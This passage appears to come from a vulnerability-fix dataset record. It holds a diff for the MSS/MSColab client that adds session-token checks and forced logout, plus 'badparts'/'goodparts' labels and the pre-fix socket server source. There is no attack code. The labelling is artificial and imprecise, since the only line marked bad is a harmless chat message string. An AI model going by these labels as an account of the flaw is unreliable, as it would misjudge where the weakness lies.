QtWidgets.QInputDialog.getText(\n-            self,\n-            self.tr('Delete Project'),\n-            self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"\n-                    f\"Enter the project name to confirm: \"))\n-        if ok:\n-            if entered_project_name == self.active_project_name:\n-                data = {\n-                    \"token\": self.token,\n-                    \"p_id\": self.active_pid\n-                }\n-                url = url_join(self.mscolab_server_url, 'delete_project')\n-                try:\n-                    res = requests.post(url, data=data)\n-                    res.raise_for_status()\n-                except requests.exceptions.RequestException as e:\n-                    logging.debug(e)\n-                    show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")\n-            else:\n-                show_popup(self, \"Error\", \"Entered project name did not match!\")\n+        if self.verify_user_token():\n+            entered_project_name, ok = QtWidgets.QInputDialog.getText(\n+                self,\n+                self.tr('Delete Project'),\n+                self.tr(f\"You're about to delete the project - '{self.active_project_name}'. \"\n+                        f\"Enter the project name to confirm: \"))\n+            if ok:\n+                if entered_project_name == self.active_project_name:\n+                    data = {\n+                        \"token\": self.token,\n+                        \"p_id\": self.active_pid\n+                    }\n+                    url = url_join(self.mscolab_server_url, 'delete_project')\n+                    try:\n+                        res = requests.post(url, data=data)\n+                        res.raise_for_status()\n+                    except requests.exceptions.RequestException as e:\n+                        logging.debug(e)\n+                        show_popup(self, \"Error\", \"Some error occurred! Could not delete project.\")\n+                else:\n+                    show_popup(self, \"Error\", \"Entered project name did not match!\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def open_chat_window(self):\n-        if self.active_pid is None:\n-            return\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n \n-        if self.chat_window is not None:\n-            self.chat_window.raise_()\n-            self.chat_window.activateWindow()\n-            return\n+            if self.chat_window is not None:\n+                self.chat_window.raise_()\n+                self.chat_window.activateWindow()\n+                return\n \n-        self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,\n-                                                   self.access_level, self.conn,\n-                                                   mscolab_server_url=self.mscolab_server_url)\n-        self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n-        self.chat_window.viewCloses.connect(self.close_chat_window)\n-        self.chat_window.reloadWindows.connect(self.reload_windows_slot)\n-        self.chat_window.show()\n+            self.chat_window = mp.MSColabProjectWindow(self.token, self.active_pid, self.user, self.active_project_name,\n+                                                       self.access_level, self.conn,\n+                                                       mscolab_server_url=self.mscolab_server_url)\n+            self.chat_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n+            self.chat_window.viewCloses.connect(self.close_chat_window)\n+            self.chat_window.reloadWindows.connect(self.reload_windows_slot)\n+            self.chat_window.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_chat_window(self):\n         self.raise_()\n         self.chat_window = None\n \n     def open_admin_window(self):\n-        if self.active_pid is None:\n-            return\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n \n-        if self.admin_window is not None:\n-            self.admin_window.raise_()\n-            self.admin_window.activateWindow()\n-            return\n+            if self.admin_window is not None:\n+                self.admin_window.raise_()\n+                self.admin_window.activateWindow()\n+                return\n \n-        self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,\n-                                                   self.active_project_name, self.projects, self.conn,\n-                                                   mscolab_server_url=self.mscolab_server_url)\n-        self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n-        self.admin_window.viewCloses.connect(self.close_admin_window)\n-        self.admin_window.show()\n+            self.admin_window = maw.MSColabAdminWindow(self.token, self.active_pid, self.user,\n+                                                       self.active_project_name, self.projects, self.conn,\n+                                                       mscolab_server_url=self.mscolab_server_url)\n+            self.admin_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n+            self.admin_window.viewCloses.connect(self.close_admin_window)\n+            self.admin_window.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_admin_window(self):\n         self.raise_()\n         self.admin_window = None\n \n     def open_version_history_window(self):\n-        if self.active_pid is None:\n-            return\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n \n-        if self.version_window is not None:\n-            self.version_window.raise_()\n-            self.version_window.activateWindow()\n-            return\n+            if self.version_window is not None:\n+                self.version_window.raise_()\n+                self.version_window.activateWindow()\n+                return\n \n-        self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,\n-                                                        self.active_project_name, self.conn,\n-                                                        mscolab_server_url=self.mscolab_server_url)\n-        self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n-        self.version_window.viewCloses.connect(self.close_version_history_window)\n-        self.version_window.reloadWindows.connect(self.reload_windows_slot)\n-        self.version_window.show()\n+            self.version_window = mvh.MSColabVersionHistory(self.token, self.active_pid, self.user,\n+                                                            self.active_project_name, self.conn,\n+                                                            mscolab_server_url=self.mscolab_server_url)\n+            self.version_window.setAttribute(QtCore.Qt.WA_DeleteOnClose)\n+            self.version_window.viewCloses.connect(self.close_version_history_window)\n+            self.version_window.reloadWindows.connect(self.reload_windows_slot)\n+            self.version_window.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_version_history_window(self):\n         self.raise_()\n@@ -611,34 +640,49 @@ def create_local_project_file(self):\n             mss_dir.writetext(rel_file_path, server_data)\n \n     def handle_work_locally_toggle(self):\n-        if self.workLocallyCheckBox.isChecked():\n-            if self.version_window is not None:\n-                self.version_window.close()\n-            self.create_local_project_file()\n-            self.local_ftml_file = fs.path.combine(self.data_dir,\n-                                                   fs.path.join('local_mscolab_data',\n-                                                                self.user['username'], self.active_project_name,\n-                                                                'mscolab_project.ftml'))\n-            self.helperTextLabel.setText(\n-                self.tr(\"Working On: Local File. Your changes are only available to you.\"\n-                        \"To save your changes with everyone, use the \\\"Save to Server\\\" button.\"))\n-            self.save_ft.setEnabled(True)\n-            self.fetch_ft.setEnabled(True)\n-            self.versionHistoryBtn.setEnabled(False)\n-            self.reload_local_wp()\n+        if self.verify_user_token():\n+            if self.workLocallyCheckBox.isChecked():\n+                if self.version_window is not None:\n+                    self.version_window.close()\n+                self.create_local_project_file()\n+                self.local_ftml_file = fs.path.combine(self.data_dir,\n+                                                       fs.path.join('local_mscolab_data',\n+                                                                    self.user['username'], self.active_project_name,\n+                                                                    'mscolab_project.ftml'))\n+                self.helperTextLabel.setText(\n+                    self.tr(\"Working On: Local File. Your changes are only available to you.\"\n+                            \"To save your changes with everyone, use the \\\"Save to Server\\\" button.\"))\n+                self.save_ft.setEnabled(True)\n+                self.fetch_ft.setEnabled(True)\n+                self.versionHistoryBtn.setEnabled(False)\n+                self.reload_local_wp()\n \n+            else:\n+                self.local_ftml_file = None\n+                self.helperTextLabel.setText(\n+                    self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"\n+                            \"Turn on work locally to work on local flight track file\"))\n+                self.save_ft.setEnabled(False)\n+                self.fetch_ft.setEnabled(False)\n+                if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:\n+                    self.versionHistoryBtn.setEnabled(True)\n+                self.waypoints_model = None\n+                self.load_wps_from_server()\n+            self.reload_view_windows()\n         else:\n-            self.local_ftml_file = None\n-            self.helperTextLabel.setText(\n-                self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"\n-                        \"Turn on work locally to work on local flight track file\"))\n-            self.save_ft.setEnabled(False)\n-            self.fetch_ft.setEnabled(False)\n-            if self.access_level in [\"admin\", \"creator\", \"collaborator\"]:\n-                self.versionHistoryBtn.setEnabled(True)\n-            self.waypoints_model = None\n-            self.load_wps_from_server()\n-        self.reload_view_windows()\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n+\n+    def verify_user_token(self):\n+        data = {\n+            \"token\": self.token\n+        }\n+        try:\n+            r = requests.get(f'{self.mscolab_server_url}\/test_authorized', data=data)\n+        except requests.exceptions.ConnectionError as ex:\n+            logging.error(\"unexpected error: %s %s\", type(ex), ex)\n+            return False\n+        return r.text == \"True\"\n \n     def authorize(self):\n         for key, value in config_loader(dataset=\"MSC_login\").items():\n@@ -701,52 +745,64 @@ def after_authorize(self, emailid, r):\n \n     def add_projects(self):\n         # add projects\n-        data = {\n-            \"token\": self.token\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n-        if r.text != \"False\":\n-            _json = json.loads(r.text)\n-            self.projects = _json[\"projects\"]\n-            self.add_projects_to_ui(self.projects)\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n+            if r.text != \"False\":\n+                _json = json.loads(r.text)\n+                self.projects = _json[\"projects\"]\n+                self.add_projects_to_ui(self.projects)\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def get_recent_pid(self):\n         \"\"\"\n         get most recent project's p_id\n         \"\"\"\n-        data = {\n-            \"token\": self.token\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n-        if r.text != \"False\":\n-            _json = json.loads(r.text)\n-            projects = _json[\"projects\"]\n-            p_id = None\n-            if projects:\n-                p_id = projects[-1][\"p_id\"]\n-            return p_id\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n+            if r.text != \"False\":\n+                _json = json.loads(r.text)\n+                projects = _json[\"projects\"]\n+                p_id = None\n+                if projects:\n+                    p_id = projects[-1][\"p_id\"]\n+                return p_id\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def get_recent_project(self):\n         \"\"\"\n         get most recent project\n         \"\"\"\n-        data = {\n-            \"token\": self.token\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n-        if r.text != \"False\":\n-            _json = json.loads(r.text)\n-            projects = _json[\"projects\"]\n-            recent_project = None\n-            if projects:\n-                recent_project = projects[-1]\n-            return recent_project\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/projects', data=data)\n+            if r.text != \"False\":\n+                _json = json.loads(r.text)\n+                projects = _json[\"projects\"]\n+                recent_project = None\n+                if projects:\n+                    recent_project = projects[-1]\n+                return recent_project\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def add_projects_to_ui(self, projects):\n         logging.debug(\"adding projects to ui\")\n@@ -772,45 +828,47 @@ def force_close_view_windows(self):\n         self.active_windows = []\n \n     def set_active_pid(self, item):\n-        if item.p_id == self.active_pid:\n-            return\n-        # close all hanging window\n-        self.force_close_view_windows()\n-        self.close_external_windows()\n-        # Turn off work locally toggle\n-        self.workLocallyCheckBox.blockSignals(True)\n-        self.workLocallyCheckBox.setChecked(False)\n-        self.workLocallyCheckBox.blockSignals(False)\n-        self.save_ft.setEnabled(False)\n-        self.fetch_ft.setEnabled(False)\n-\n-        # set active_pid here\n-        self.active_pid = item.p_id\n-        self.access_level = item.access_level\n-        self.active_project_name = item.text().split(\"-\")[0].strip()\n-        self.waypoints_model = None\n-        # set active flightpath here\n-        self.load_wps_from_server()\n-        # enable project specific buttons\n-        self.helperTextLabel.setVisible(True)\n-        self.helperTextLabel.setText(self.tr(\"Working On: Shared File. All your changes will be shared with everyone.\"\n-                                             \"Turn on work locally to work on local flight track file\"))\n-        self.importBtn.setEnabled(True)\n-        self.exportBtn.setEnabled(True)\n-        self.topview.setEnabled(True)\n-        self.sideview.setEnabled(True)\n-        self.tableview.setEnabled(True)\n-        self.workLocallyCheckBox.setEnabled(True)\n-\n-        # enable access level specific buttons\n-        self.handle_mscolab_buttons()\n-\n-        # change font style for selected\n-        font = QtGui.QFont()\n-        for i in range(self.listProjects.count()):\n-            self.listProjects.item(i).setFont(font)\n-        font.setBold(True)\n-        item.setFont(font)\n+        if self.verify_user_token():\n+            if item.p_id == self.active_pid:\n+                return\n+            # close all hanging window\n+            self.force_close_view_windows()\n+            self.close_external_windows()\n+            # Turn off work locally toggle\n+            self.workLocallyCheckBox.blockSignals(True)\n+            self.workLocallyCheckBox.setChecked(False)\n+            self.workLocallyCheckBox.blockSignals(False)\n+            self.save_ft.setEnabled(False)\n+            self.fetch_ft.setEnabled(False)\n+            # set active_pid here\n+            self.active_pid = item.p_id\n+            self.access_level = item.access_level\n+            self.active_project_name = item.text().split(\"-\")[0].strip()\n+            self.waypoints_model = None\n+            # set active flightpath here\n+            self.load_wps_from_server()\n+            # enable project specific buttons\n+            self.helperTextLabel.setVisible(True)\n+            self.helperTextLabel.setText(self.tr(\"Working On: Shared File.\"\n+                                                 \"All your changes will be shared with everyone.\"\n+                                                 \"Turn on work locally to work on local flight track file\"))\n+            self.importBtn.setEnabled(True)\n+            self.exportBtn.setEnabled(True)\n+            self.topview.setEnabled(True)\n+            self.sideview.setEnabled(True)\n+            self.tableview.setEnabled(True)\n+            self.workLocallyCheckBox.setEnabled(True)\n+            # enable access level specific buttons\n+            self.handle_mscolab_buttons()\n+            # change font style for selected\n+            font = QtGui.QFont()\n+            for i in range(self.listProjects.count()):\n+                self.listProjects.item(i).setFont(font)\n+            font.setBold(True)\n+            item.setFont(font)\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def reload_wps_from_server(self):\n         if self.active_pid is None:\n@@ -819,16 +877,20 @@ def reload_wps_from_server(self):\n         self.reload_view_windows()\n \n     def request_wps_from_server(self):\n-        data = {\n-            \"token\": self.token,\n-            \"p_id\": self.active_pid\n-        }\n-        r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)\n-        if r.text != \"False\":\n-            xml_content = json.loads(r.text)[\"content\"]\n-            return xml_content\n+        if self.verify_user_token():\n+            data = {\n+                \"token\": self.token,\n+                \"p_id\": self.active_pid\n+            }\n+            r = requests.get(self.mscolab_server_url + '\/get_project_by_id', data=data)\n+            if r.text != \"False\":\n+                xml_content = json.loads(r.text)[\"content\"]\n+                return xml_content\n+            else:\n+                show_popup(self, \"Error\", \"Session expired, new login required\")\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def load_wps_from_server(self):\n         if self.workLocallyCheckBox.isChecked():\n@@ -840,21 +902,33 @@ def load_wps_from_server(self):\n \n     def open_topview(self):\n         # showing dummy info dialog\n-        if self.active_pid is None:\n-            return\n-        self.create_view_window(\"topview\")\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n+            self.create_view_window(\"topview\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def open_sideview(self):\n         # showing dummy info dialog\n-        if self.active_pid is None:\n-            return\n-        self.create_view_window(\"sideview\")\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n+            self.create_view_window(\"sideview\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def open_tableview(self):\n         # showing dummy info dialog\n-        if self.active_pid is None:\n-            return\n-        self.create_view_window(\"tableview\")\n+        if self.verify_user_token():\n+            if self.active_pid is None:\n+                return\n+            self.create_view_window(\"tableview\")\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def create_view_window(self, _type):\n         for active_window in self.active_windows:\n@@ -943,18 +1017,22 @@ def logout(self):\n         self.password.setEnabled(True)\n \n     def delete_account(self):\n-        w = QtWidgets.QWidget()\n-        qm = QtWidgets.QMessageBox\n-        reply = qm.question(w, self.tr('Continue?'),\n-                            self.tr(\"You're about to delete your account. You cannot undo this operation!\"),\n-                            qm.Yes, qm.No)\n-        if reply == QtWidgets.QMessageBox.No:\n-            return\n-        data = {\n-            \"token\": self.token\n-        }\n-        requests.post(self.mscolab_server_url + '\/delete_user', data=data)\n-        self.clean_up_window()\n+        if self.verify_user_token():\n+            w = QtWidgets.QWidget()\n+            qm = QtWidgets.QMessageBox\n+            reply = qm.question(w, self.tr('Continue?'),\n+                                self.tr(\"You're about to delete your account. You cannot undo this operation!\"),\n+                                qm.Yes, qm.No)\n+            if reply == QtWidgets.QMessageBox.No:\n+                return\n+            data = {\n+                \"token\": self.token\n+            }\n+            requests.post(self.mscolab_server_url + '\/delete_user', data=data)\n+            self.clean_up_window()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def close_external_windows(self):\n         if self.chat_window is not None:\n@@ -995,27 +1073,35 @@ def clean_up_window(self):\n         save_settings_qsettings('mscolab', self.settings)\n \n     def save_wp_mscolab(self, comment=None):\n-        server_xml = self.request_wps_from_server()\n-        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n-        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)\n-        self.merge_dialog.saveBtn.setDisabled(True)\n-        if self.merge_dialog.exec_():\n-            xml_content = self.merge_dialog.get_values()\n-            if xml_content is not None:\n-                self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)\n-                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n-                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n-                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n-                self.reload_view_windows()\n-                show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)\n-        self.merge_dialog = None\n+        if self.verify_user_token():\n+            server_xml = self.request_wps_from_server()\n+            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n+            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, parent=self)\n+            self.merge_dialog.saveBtn.setDisabled(True)\n+            if self.merge_dialog.exec_():\n+                xml_content = self.merge_dialog.get_values()\n+                if xml_content is not None:\n+                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=comment)\n+                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n+                    self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                    self.reload_view_windows()\n+                    show_popup(self, \"Success\", \"New Waypoints Saved To Server!\", icon=1)\n+            self.merge_dialog = None\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def handle_waypoints_changed(self):\n-        if self.workLocallyCheckBox.isChecked():\n-            self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+        if self.verify_user_token():\n+            if self.workLocallyCheckBox.isChecked():\n+                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+            else:\n+                xml_content = self.waypoints_model.get_xml_content()\n+                self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n         else:\n-            xml_content = self.waypoints_model.get_xml_content()\n-            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def reload_view_windows(self):\n         for window in self.active_windows:\n@@ -1032,19 +1118,23 @@ def reload_local_wp(self):\n         self.reload_view_windows()\n \n     def fetch_wp_mscolab(self):\n-        server_xml = self.request_wps_from_server()\n-        server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n-        self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)\n-        self.merge_dialog.saveBtn.setDisabled(True)\n-        if self.merge_dialog.exec_():\n-            xml_content = self.merge_dialog.get_values()\n-            if xml_content is not None:\n-                self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n-                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n-                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n-                self.reload_view_windows()\n-                show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", icon=1)\n-        self.merge_dialog = None\n+        if self.verify_user_token():\n+            server_xml = self.request_wps_from_server()\n+            server_waypoints_model = ft.WaypointsTableModel(xml_content=server_xml)\n+            self.merge_dialog = MscolabMergeWaypointsDialog(self.waypoints_model, server_waypoints_model, True, self)\n+            self.merge_dialog.saveBtn.setDisabled(True)\n+            if self.merge_dialog.exec_():\n+                xml_content = self.merge_dialog.get_values()\n+                if xml_content is not None:\n+                    self.waypoints_model = ft.WaypointsTableModel(xml_content=xml_content)\n+                    self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                    self.reload_view_windows()\n+                    show_popup(self, \"Success\", \"New Waypoints Fetched To Local File!\", icon=1)\n+            self.merge_dialog = None\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     @QtCore.Slot(int, int, str)\n     def handle_update_permission(self, p_id, u_id, access_level):\n@@ -1147,7 +1237,8 @@ def render_new_permission(self, p_id, u_id):\n             if self.chat_window is not None:\n                 self.chat_window.load_users()\n         else:\n-            show_popup(self, \"Error\", \"Session expired, new login required\")\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     @QtCore.Slot(int)\n     def handle_project_deleted(self, p_id):\ndiff --git a\/mslib\/msui\/socket_control.py b\/mslib\/msui\/socket_control.py\nindex 21ca4b038..b7e03e060 100644\n--- a\/mslib\/msui\/socket_control.py\n+++ b\/mslib\/msui\/socket_control.py\n@@ -161,6 +161,7 @@ def delete_message(self, message_id, p_id):\n         })\n \n     def save_file(self, token, p_id, content, comment=None):\n+        # ToDo refactor API\n         logging.debug(\"saving file\")\n         self.sio.emit('file-save', {\n                       \"p_id\": p_id,\n","files":{"\/mslib\/mscolab\/sockets_manager.py":{"changes":[{"diff":"\n             # if permission is correct and file saved properly\n             if perm and self.fm.save_file(int(p_id), content, user, comment):\n                 # send service message\n-                message_ = \"[service message] saved changes\"\n+                message_ = f\"[service message] **{user.username}** saved changes\"\n                 new_message = self.cm.add_message(user, message_, str(p_id), message_type=MessageType.SYSTEM_MESSAGE)\n                 new_message_dict = get_message_dict(new_message)\n                 socketio.emit('chat-message-client', json.dumps(new_message_dict), room=str(p_id))\n                 # emit file-changed event to trigger reload of flight track\n                 socketio.emit('file-changed', json.dumps({\"p_id\": p_id, \"u_id\": user.id}), room=str(p_id))\n+        else:\n+            logging.debug(f'login expired for {user.username}, state unauthorized!')\n \n     def emit_file_change(self, p_id):\n         socketio.emit('file-changed', json.dumps({\"p_id\": p_id}), room=str(p_id))","add":3,"remove":1,"filename":"\/mslib\/mscolab\/sockets_manager.py","badparts":["                message_ = \"[service message] saved changes\""],"goodparts":["                message_ = f\"[service message] **{user.username}** saved changes\"","        else:","            logging.debug(f'login expired for {user.username}, state unauthorized!')"]},{"diff":"\n             # if permission is correct and file saved properly\n             if perm and self.fm.save_file(int(p_id), content, user, comment):\n                 # send service message\n-                message_ = \"[service message] saved changes\"\n+                message_ = f\"[service message] **{user.username}** saved changes\"\n                 new_message = self.cm.add_message(user, message_, str(p_id), message_type=MessageType.SYSTEM_MESSAGE)\n                 new_message_dict = get_message_dict(new_message)\n                 socketio.emit('chat-message-client', json.dumps(new_message_dict), room=str(p_id))\n                 # emit file-changed event to trigger reload of flight track\n                 socketio.emit('file-changed', json.dumps({\"p_id\": p_id, \"u_id\": user.id}), room=str(p_id))\n+        else:\n+            logging.debug(f'login expired for {user.username}, state unauthorized!')\n \n     def emit_file_change(self, p_id):\n         socketio.emit('file-changed', json.dumps({\"p_id\": p_id}), room=str(p_id))","add":3,"remove":1,"filename":"\/mslib\/mscolab\/sockets_manager.py","badparts":["                message_ = \"[service message] saved changes\""],"goodparts":["                message_ = f\"[service message] **{user.username}** saved changes\"","        else:","            logging.debug(f'login expired for {user.username}, state unauthorized!')"]}],"source":"\n \"\"\" mslib.mscolab.sockets_manager ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Code to handle socket connections in mscolab This file is part of mss. :copyright: Copyright 2019 Shivashis Padhi :copyright: Copyright 2019-2021 by the mss team, see AUTHORS. :license: APACHE-2.0, see LICENSE for details. Licensed under the Apache License, Version 2.0(the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http:\/\/www.apache.org\/licenses\/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. \"\"\" import json import logging from flask import request from flask_socketio import SocketIO, join_room, leave_room from mslib.mscolab.chat_manager import ChatManager from mslib.mscolab.file_manager import FileManager from mslib.mscolab.models import MessageType, Permission, User from mslib.mscolab.utils import get_message_dict from mslib.mscolab.utils import get_session_id socketio=SocketIO() class SocketsManager(object): \"\"\"Class with handler functions for socket related\"\"\" def __init__(self, chat_manager, file_manager): \"\"\" chat_manager: Instance of ChatManager file_manager: Instance of FileManager \"\"\" super(SocketsManager, self).__init__() self.sockets=[] self.cm=chat_manager self.fm=file_manager def handle_connect(self): logging.debug(request.sid) def join_creator_to_room(self, json_config): \"\"\" json_config has: -token: authentication token -p_id: project id \"\"\" token=json_config['token'] user=User.verify_auth_token(token) if not user: return p_id=json_config['p_id'] join_room(str(p_id)) def join_collaborator_to_room(self, u_id, p_id): \"\"\" json has: -u_id: user id(collaborator's id) -p_id: project id \"\"\" s_id=get_session_id(self.sockets, u_id) if s_id is not None: join_room(str(p_id), sid=s_id, namespace='\/') def remove_collaborator_from_room(self, u_id, p_id): s_id=get_session_id(self.sockets, u_id) if s_id is not None: leave_room(str(p_id), sid=s_id, namespace='\/') def handle_start_event(self, json): \"\"\" json is a dictionary version of data sent to backend \"\"\" logging.info('received json: ' +str(json)) token=json['token'] user=User.verify_auth_token(token) if not user: return permissions=Permission.query.filter_by(u_id=user.id).all() for permission in permissions: \"\"\" -a client is always registered as a room with name equal to the session id of the client. -so the rooms can safely be named as stringified versions of the project id. -thus, an abstraction is unnecessary. if it will be, it'll be considered during later developments. -so joining the actual socketio room would be enough \"\"\" join_room(str(permission.p_id)) socket_storage={ 's_id': request.sid, 'u_id': user.id } self.sockets.append(socket_storage) def handle_disconnect(self): logging.info(\"disconnected\") logging.info(request.sid) self.sockets[:]=[d for d in self.sockets if d['s_id'] !=request.sid] def handle_message(self, _json): \"\"\" json is a dictionary version of data sent to back-end \"\"\" p_id=_json['p_id'] reply_id=int(_json[\"reply_id\"]) user=User.verify_auth_token(_json['token']) if user is not None: perm=self.permission_check_emit(user.id, int(p_id)) if perm: new_message=self.cm.add_message(user, _json['message_text'], str(p_id), reply_id=reply_id) new_message_dict=get_message_dict(new_message) if reply_id==-1: socketio.emit('chat-message-client', json.dumps(new_message_dict), room=str(p_id)) else: socketio.emit('chat-message-reply-client', json.dumps(new_message_dict), room=str(p_id)) def handle_message_edit(self, socket_message): message_id=socket_message[\"message_id\"] p_id=socket_message[\"p_id\"] new_message_text=socket_message[\"new_message_text\"] user=User.verify_auth_token(socket_message[\"token\"]) if user is not None: perm=self.permission_check_emit(user.id, int(p_id)) if perm: self.cm.edit_message(message_id, new_message_text) socketio.emit('edit-message-client', json.dumps({ \"message_id\": message_id, \"new_message_text\": new_message_text }), room=str(p_id)) def handle_message_delete(self, socket_message): message_id=socket_message[\"message_id\"] p_id=socket_message[\"p_id\"] user=User.verify_auth_token(socket_message['token']) if user is not None: perm=self.permission_check_emit(user.id, int(p_id)) if perm: self.cm.delete_message(message_id) socketio.emit('delete-message-client', json.dumps({\"message_id\": message_id}), room=str(p_id)) def permission_check_emit(self, u_id, p_id): \"\"\" u_id: user-id p_id: project-id \"\"\" permission=Permission.query.filter_by(u_id=u_id, p_id=p_id).first() if not permission: return False if permission.access_level==\"viewer\": return False return True def permission_check_admin(self, u_id, p_id): \"\"\" u_id: user-id p_id: project-id \"\"\" permission=Permission.query.filter_by(u_id=u_id, p_id=p_id).first() if permission.access_level==\"creator\" or permission.access_level==\"admin\": return True else: return False def handle_file_save(self, json_req): \"\"\" json_req:{ \"p_id\": process id \"content\": content of the file \"comment\": comment for file-save, defaults to None } \"\"\" p_id=json_req['p_id'] content=json_req['content'] comment=json_req.get('comment', \"\") user=User.verify_auth_token(json_req['token']) if user is not None: perm=self.permission_check_emit(user.id, int(p_id)) if perm and self.fm.save_file(int(p_id), content, user, comment): message_=\"[service message] saved changes\" new_message=self.cm.add_message(user, message_, str(p_id), message_type=MessageType.SYSTEM_MESSAGE) new_message_dict=get_message_dict(new_message) socketio.emit('chat-message-client', json.dumps(new_message_dict), room=str(p_id)) socketio.emit('file-changed', json.dumps({\"p_id\": p_id, \"u_id\": user.id}), room=str(p_id)) def emit_file_change(self, p_id): socketio.emit('file-changed', json.dumps({\"p_id\": p_id}), room=str(p_id)) def emit_new_permission(self, u_id, p_id): \"\"\" to refresh project list of u_id and to refresh collaborators' list \"\"\" socketio.emit('new-permission', json.dumps({\"p_id\": p_id, \"u_id\": u_id}), room=str(p_id)) def emit_update_permission(self, u_id, p_id, access_level=None): \"\"\" to refresh permissions in msui \"\"\" if access_level is None: perm=Permission.query.filter_by(u_id=u_id, p_id=p_id).first() access_level=perm.access_level logging.debug(\"access_level by database query\") 